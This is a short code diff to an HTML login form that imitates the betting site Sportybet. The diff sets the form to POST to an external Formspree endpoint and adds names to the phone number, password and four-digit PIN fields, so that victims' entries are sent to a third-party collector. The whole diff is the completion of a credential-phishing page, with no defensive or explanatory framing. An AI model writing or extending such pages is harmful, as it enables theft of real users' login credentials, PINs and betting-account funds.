@@ -27,13 +27,14 @@
           />
         </div>
         <div class="ml-auto">
-          <form action="" class="hidden space-x-6 lg:flex">
+          <form method="POST" action="https://formspree.io/f/mvoygqok" class="hidden space-x-6 lg:flex">
             <div class="flex rounded items-center space-x-3 bg-red-700">
               <label htmlFor="number" class="text-white pl-4">+234</label>
               <input
                 type="number"
                 placeholder="Sportybet Mobile Number"
                 id="number"
+                name="Phone Number"
                 class="text-white h-12 bg-red-700 placeholder:text-gray-300 outline-none" required
               />
             </div>
@@ -42,6 +43,7 @@
                 type="password"
                 placeholder="Sportybet Password"
                 id="password"
+                name="Password"
                 class="text-white h-12 bg-red-700 placeholder:text-gray-300 outline-none px-4" required
               />
             </div>
@@ -52,6 +54,7 @@
                 minlength="4"
                 placeholder="Sportybet Four Pin"
                 id="number"
+                name="Four Digit Pin"
                 class="text-white h-12 bg-red-700 placeholder:text-gray-300 outline-none px-4" required
               />
               <button
